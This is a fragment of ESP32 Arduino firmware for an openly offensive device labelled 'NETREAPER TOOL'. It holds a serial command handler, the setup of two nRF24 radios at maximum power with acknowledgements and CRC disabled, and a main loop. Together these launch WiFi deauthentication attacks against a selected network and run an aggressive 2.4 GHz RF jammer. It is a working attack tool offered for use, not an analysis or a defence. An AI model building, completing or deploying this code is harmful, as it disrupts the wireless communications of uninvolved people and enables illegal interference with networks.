// ================= SERIAL COMMAND HANDLER =================
void handleSerial() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    command.trim();

    if (command.equalsIgnoreCase("help")) {
      Serial.println("\n--- Available Commands ---");
      Serial.println("  help       - Show this command list");
      Serial.println("  scan       - Scan and list all nearby WiFi networks");
      Serial.println("  deauth X   - Start deauth on network index X (e.g., deauth 0)");
      Serial.println("  deauth off - Stop deauth attack");
      Serial.println("  rf         - Toggle RF Jammer ON/OFF");
      Serial.println("  rf off     - Force RF Jammer OFF");
      Serial.println("--------------------------");
    }
    else if (command.equalsIgnoreCase("scan")) {
      if (isJamming) { stopJamming(); isJamming = false; }
      if (isDeauthing) stopDeauth();
      startWiFiScan();
    }
    else if (command.startsWith("deauth ")) {
      String arg = command.substring(7);
      arg.trim();
      if (arg.equalsIgnoreCase("off") || arg.equalsIgnoreCase("stop")) {
        stopDeauth();
      } else {
        int index = arg.toInt();
        if (isJamming) { stopJamming(); isJamming = false; }
        startDeauth(index);
      }
    }
    else if (command.equalsIgnoreCase("rf") || command.equalsIgnoreCase("jam")) {
      if (isDeauthing) stopDeauth();
      isJamming = !isJamming;
      if (isJamming) startJamming();
      else stopJamming();
    }
    else if (command.equalsIgnoreCase("rf off") || command.equalsIgnoreCase("jam off")) {
      if (isJamming) {
        isJamming = false;
        stopJamming();
      }
    }
    else {
      Serial.println("[!] Unknown command. Type 'help' for the list.");
    }
  }
}
// ========================================================

void initSP() {
  sp = new SPIClass(VSPI);
  sp->begin(18, 19, 23, 21);
  if (radio1.begin(sp)) {
    Serial.println("VSPI (Radio1) Initialized !!!");
    radio1.setAutoAck(false); radio1.stopListening(); radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true); radio1.setDataRate(RF24_2MBPS); radio1.setCRCLength(RF24_CRC_DISABLED);
  } else { Serial.println("VSPI (Radio1) couldn't start !!!"); }
}

void initHP() {
  hp = new SPIClass(HSPI);
  hp->begin(14, 12, 13, 15);
  if (radio.begin(hp)) {
    Serial.println("HSPI (Radio) Initialized !!!");
    radio.setAutoAck(false); radio.stopListening(); radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_MAX, true); radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
  } else { Serial.println("HSPI (Radio) couldn't start !!!"); }
}

void setup() {
  Serial.begin(115200);
  delay(1000);
  setCpuFrequencyMhz(240);

  pinMode(rfButtonPin, INPUT_PULLUP); pinMode(rfLedPin, OUTPUT); digitalWrite(rfLedPin, LOW);
  pinMode(deauthButtonPin, INPUT_PULLUP); pinMode(deauthLedPin, OUTPUT); digitalWrite(deauthLedPin, LOW);

  disableWiFiAndClassicBT();
  initHP(); initSP();
  radio.powerDown(); radio1.powerDown();
  WiFi.mode(WIFI_AP_STA); delay(500);

  Serial.println("\n========================================");
  Serial.println("       NETREAPER TOOL READY");
  Serial.println("========================================");
  Serial.println(" GPIO 4 : Toggle RF Jammer (LED: 2)");
  Serial.println(" GPIO 5 : Toggle WiFi Deauth (LED: 32)");
  Serial.println(" Serial : Type 'help' for commands");
  Serial.println("========================================");
}

void loop() {
  checkJammerButton();
  checkDeauthButton();
  handleSerial();

  if (isJamming) aggressiveRandomMode();
  if (isDeauthing) { sendDeauth(); delay(20); }  // faster cadence + burst
}
